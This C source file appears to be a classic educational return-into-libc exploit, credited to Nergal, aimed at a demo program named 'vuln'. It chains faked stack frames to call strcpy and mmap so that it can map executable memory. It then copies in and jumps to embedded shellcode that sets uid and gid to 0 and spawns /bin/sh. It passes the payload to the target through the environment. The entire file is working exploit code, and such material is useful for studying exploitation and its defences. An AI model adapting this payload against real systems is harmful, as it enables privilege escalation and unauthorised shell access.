/* by Nergal for vuln.c without -fomit-frame-pointer */
#include <stdio.h>
#include <stddef.h>
#include <sys/mman.h>

#define LIBC        0x40018000//0x40018000//0x4001e000
#define STRCPY       0x08048308
#define MMAP         (0x000afaf0+LIBC)
#define LEAVERET    0x080483bb//0x80484bd
#define FRAMES      0xbffffe60

#define MMAP_START  0xaa011000

char hellcode[] =
    "\x90"
    "\x31\xc0\xb0\x31\xcd\x80\x93\x31\xc0\xb0\x17\xcd\x80"
    "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
    "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
    "\x80\xe8\xdc\xff\xff\xff/bin/sh";


/* See the comments in ex-move.c */
struct two_arg {
        unsigned int new_ebp;
        unsigned int func;
        unsigned int leave_ret;
        unsigned int param1;
        unsigned int param2;
};
struct mmap_args {
        unsigned int new_ebp;
        unsigned int func;
        unsigned int leave_ret;
        unsigned int start;
        unsigned int length;
        unsigned int prot;
        unsigned int flags;
        unsigned int fd;
        unsigned int offset;
};

struct ov {
        char scratch[16];
        unsigned int ebp;
        unsigned int eip;
};

struct ourbuf {
        struct two_arg zero1;
        struct two_arg zero2;
        struct mmap_args mymmap;
        struct two_arg trans;
        char hell[sizeof(hellcode)];
};

#define PTR_TO_NULL (FRAMES+sizeof(struct ourbuf))

main(int argc, char **argv)
{
        char lg[sizeof(struct ov) + sizeof(struct ourbuf) + 4 + 1];
        char *env[2] = { lg, 0 };
        struct ourbuf thebuf;
        struct ov theov;
        int i;

        memset(theov.scratch, 'X', sizeof(theov.scratch));

        if (argc == 2 && !strcmp("testing", argv[1])) {
                for (i = 0; i < sizeof(theov.scratch); i++)
                        theov.scratch[i] = i + 0x10;
                theov.ebp = 0x01020304;
                theov.eip = 0x05060708;
        } else {
                theov.ebp = FRAMES;
                theov.eip = LEAVERET;
        }
        thebuf.zero1.new_ebp = FRAMES + offsetof(struct ourbuf, zero2);
        thebuf.zero1.func = STRCPY;
        thebuf.zero1.leave_ret = LEAVERET;
        thebuf.zero1.param1 = FRAMES + offsetof(struct ourbuf, mymmap) +
            offsetof(struct mmap_args, offset);
        thebuf.zero1.param2 = PTR_TO_NULL;

        thebuf.zero2.new_ebp = FRAMES + offsetof(struct ourbuf, mymmap);
        thebuf.zero2.func = STRCPY;
        thebuf.zero2.leave_ret = LEAVERET;
        thebuf.zero2.param1 = FRAMES + offsetof(struct ourbuf, mymmap) +
            offsetof(struct mmap_args, start);
        thebuf.zero2.param2 = PTR_TO_NULL;

        thebuf.mymmap.new_ebp = FRAMES + offsetof(struct ourbuf, trans);
        thebuf.mymmap.func = MMAP;
        thebuf.mymmap.leave_ret = LEAVERET;
        thebuf.mymmap.start = MMAP_START + 1;
        thebuf.mymmap.length = 0x01020304;
        thebuf.mymmap.prot =
            0x01010100 | PROT_EXEC | PROT_READ | PROT_WRITE;
        /* again, careful not to include MAP_GROWS_DOWN below */
        thebuf.mymmap.flags =
            0x01010200 | MAP_FIXED | MAP_PRIVATE | MAP_ANONYMOUS;
        thebuf.mymmap.fd = 0xffffffff;
        thebuf.mymmap.offset = 0x01021001;

        thebuf.trans.new_ebp = 0x01020304;
        thebuf.trans.func = STRCPY;
        thebuf.trans.leave_ret = MMAP_START + 1;
        thebuf.trans.param1 = MMAP_START + 1;
        thebuf.trans.param2 = FRAMES + offsetof(struct ourbuf, hell);

        memset(thebuf.hell, 'x', sizeof(thebuf.hell));
        strncpy(thebuf.hell, hellcode, strlen(hellcode));

        memcpy(lg, &theov, sizeof(theov));
        memcpy(lg + sizeof(theov), &thebuf, sizeof(thebuf));
        lg[sizeof(thebuf) + sizeof(theov)] = 0;

        if (sizeof(struct ov) + sizeof(struct ourbuf) != strlen(lg)) {
                fprintf(stderr,
                    "size=%i len=%i; zero(s) in the payload, correct it.\n",
                    sizeof(struct ov) + sizeof(struct ourbuf) ,
                    strlen(lg));
                exit(1);
        }
	execle("./vuln", "./vuln", lg, NULL, 0);
}
